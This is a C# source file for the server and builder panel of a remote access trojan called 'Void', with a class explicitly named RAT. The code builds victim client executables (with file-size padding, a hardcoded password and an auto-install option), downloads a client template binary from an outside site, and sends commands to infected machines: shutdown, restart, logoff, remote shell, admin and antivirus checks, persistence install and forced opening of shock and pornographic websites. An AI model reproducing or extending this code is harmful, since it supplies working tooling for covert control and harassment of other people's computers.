using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.Windows.Forms;
using Void_server.Controls;
using Void_server.Libs;
using Void_server.Popups;
using Snake;

namespace Void_server
{
    public partial class MainForm : Form
    {
        //create variables
        public static List<Panel> menuPanels = new List<Panel>();
        public static ClientBar currentSelectedBar = null;
        public static ContextMenuStrip clientOptions { get; set; }
        public static RemoteCMD cmd { get; set; }
        private static int port { get; set; }

        public MainForm(int appliedPort)
        {
            InitializeComponent();

            //set the port and the text in the build page's 'portBox'
            port = appliedPort;
            portBox.Text = port.ToString();

            //select home page
            gotoHome.BackColor = gotoHome.selCol;
            gotoHome.linkedPanel.Visible = true;

            //add all the pages to the 'menuPanels' variable
            foreach (Panel page in mainPanel.Controls)
                menuPanels.Add(page);

            //set context menu strip
            clientOptions = clientBarOptions;
        }

        private void exit_Click(object sender, EventArgs e)
        {
            this.Hide();

            //tell all the connected clients that we are closing
            ClientBar.SupressErrors = true;

            //tell all clients that the server is shutting down
            foreach (ClientBar bar in clientsPanel.Controls)
                RAT.Send("shutting", bar);

            Application.Exit();
        }

        private void minimize_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void drag_handler(object sender, MouseEventArgs e)
        {
            Snake.Controls.Drag(e, this);
        }

        private void browse_Click(object sender, EventArgs e)
        {
            //make a 'SaveFileDialog', and set it's properties (this is for getting a user specified path)
            SaveFileDialog dialog = new SaveFileDialog();

            dialog.FileName = "Client.exe";
            dialog.Filter = "executable |*.exe";
            dialog.Title = "Choose build path";

            if (dialog.ShowDialog() == DialogResult.OK)
                buildPathBox.Text = dialog.FileName;
        }

        private async void build_Click(object sender, EventArgs e)
        {
            if (build.Text == "Building...")
                return;

            //get options
            BuildOptions options = GetOptions();

            if (!options.isSucceded) //if failed
                return; //return

            build.Text = "Building...";
            await Task.Run(() => Builder.Build(options, statusLabel));
            build.Text = "Build";
        }

        private async void Form1_Load(object sender, EventArgs e)
        {
            //set the form
            RAT.caller = this;

            //start the server async
            await Task.Run(() => RAT.StartServer(port));

            statusLabel.Text = "Server started";
            await Task.Delay(4000);
            statusLabel.Text = "";
        }

        private void removeBar_Click(object sender, EventArgs e)
        {
            RAT.Send("shutting");
            currentSelectedBar.session.Stop();
            clientsPanel.Controls.Remove(currentSelectedBar);
            AllignClientBars(clientsPanel);
        }

        private void clientBarOptions_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {
            cmdInstall.Enabled = !currentSelectedBar.isAutoInstall;
        }

        private void enAddJunk_CheckChanged(object sender, CheckEventArgs e)
        {
            if (enAddJunk.Checked)
            {
                DefaultInputForm input = new DefaultInputForm("enter size to add (MB):", "10");
                input.ShowDialog();

                if (!Checking.CheckConvertInt(input.results[0]))
                {
                    MessageBox.Show("Please enter a valid number");
                    enAddJunk.Checked = false;
                    return;
                }

                enAddJunk.optionalValue = (int.Parse(input.results[0]) * 1048576).ToString();
            }
        }

        #region cmds
        private void cmdGetBleu_Click(object sender, EventArgs e)
        {
            RAT.Send("info|bleu");
        }

        private void cmdShutdown_Click(object sender, EventArgs e)
        {
            RAT.Send("pc|shutdown");
        }

        private void cmdRestart_Click(object sender, EventArgs e)
        {
            RAT.Send("pc|restart");
        }

        private void cmdLogOff_Click(object sender, EventArgs e)
        {
            RAT.Send("pc|logoff");
        }

        private void customToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenProcess proc = new OpenProcess();
            proc.ShowDialog();
        }

        private void meatProc_Click(object sender, EventArgs e)
        {
            RAT.Send($"process|http://meatspin.fr/|1");
        }

        private void pornProc_Click(object sender, EventArgs e)
        {
            RAT.Send($"process|https://www.pornhub.com/|1");
        }

        private void cmdShowMsg_Click(object sender, EventArgs e)
        {
            ShowMsg msg = new ShowMsg();
            msg.ShowDialog();
        }

        private void cmdRCMD_Click(object sender, EventArgs e)
        {
            //the remote cmd has a bug where if you open it once, close it, and open it again it won't work, gotta fix that in the future i guess
            RemoteCMD rCmd = new RemoteCMD();
            cmd = rCmd;
            rCmd.ShowDialog();
        }

        private void cmdCheckAdmin_Click(object sender, EventArgs e)
        {
            RAT.Send("info|isadmin");
        }

        private void cmdInstall_Click(object sender, EventArgs e)
        {
            RAT.Send("rat|install");
        }

        private void cmdUninstall_Click(object sender, EventArgs e)
        {
            RAT.Send("rat|uninstall");
        }

        private void cmdAntivirus_Click(object sender, EventArgs e)
        {
            RAT.Send("info|avirus");
        }
        #endregion

        #region methods
        public static void AllignClientBars(Panel clientsPanel)
        { 
            //allign all the client bars
            int currentOffset = 0;
            foreach (ClientBar bar in clientsPanel.Controls)
            {
                bar.Top = currentOffset;
                currentOffset += bar.Height;
            }
        }

        private OpenFileDialog RequestFile(string filter)
        {
            OpenFileDialog dialog = new OpenFileDialog();

            dialog.Title = "Select file";

            dialog.Filter = filter;

            return dialog;
        }

        private BuildOptions GetOptions()
        {
            BuildOptions options = new BuildOptions();
            //check all the information, if anything is invalid show errors
            if (Checking.CheckNullOrEmpty(buildPathBox.Text, nameBox.Text, descBox.Text, comBox.Text))
            {
                MessageBox.Show("Please fill out all required fields", "error");
                return options;
            }
            if (Checking.CheckConvertInt(portBox.Text))
            {
                if (Checking.CheckPort(int.Parse(portBox.Text)))
                {
                    MessageBox.Show("Please enter a valid port", "error");
                    return options;
                }
            }
            else
            {
                MessageBox.Show("Please enter a valid port", "error");
                return options;
            }

            //get all the version textboxs
            Control[] vs =
            {
                v2,
            };

            //go through all the version textboxes, if it's empty; add a 0
            foreach (var v in vs)
            {
                if (string.IsNullOrEmpty(v.Text))
                    v.Text = "0";
            }

            StyledCheckBox[] settings =
            {
                enAutoInstall,
                enAddJunk
            };
            
            //set assembly information
            string[] aInfo =
            {
                nameBox.Text,
                descBox.Text,
                $"{v2.Text}",
                comBox.Text
            };

            //set other properties
            options.AssemblyInformation = aInfo;
            options.OutputPath = buildPathBox.Text;
            options.Password = "lolkeklmaoecksdeejgorjggjripdttj56yu6";
            options.additionalSettings = settings;
            options.serverIP = ipBox.Text;
            options.port = portBox.Text;

            if (!Web.DownloadFileWithCheck("https://supaepicapplel.weebly.com/uploads/1/1/8/3/118308419/clienttemplate.bin", "ClientTemplate.bin"))
            {
                MessageBox.Show("Could not download the client template file", "error");
                return options;
            }

            options.isSucceded = true;
            return options;
        }
        #endregion

        private void gotoHome_Click(object sender, EventArgs e)
        {

        }

        private void portBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void buildPanel_Paint(object sender, PaintEventArgs e)
        {

        }

        private void buildPanel_Paint_1(object sender, PaintEventArgs e)
        {

        }

        private void msgBox_TextChanged(object sender, EventArgs e)
        {

        }

        private void settingsPanel_Paint(object sender, PaintEventArgs e)
        {

        }
    }
}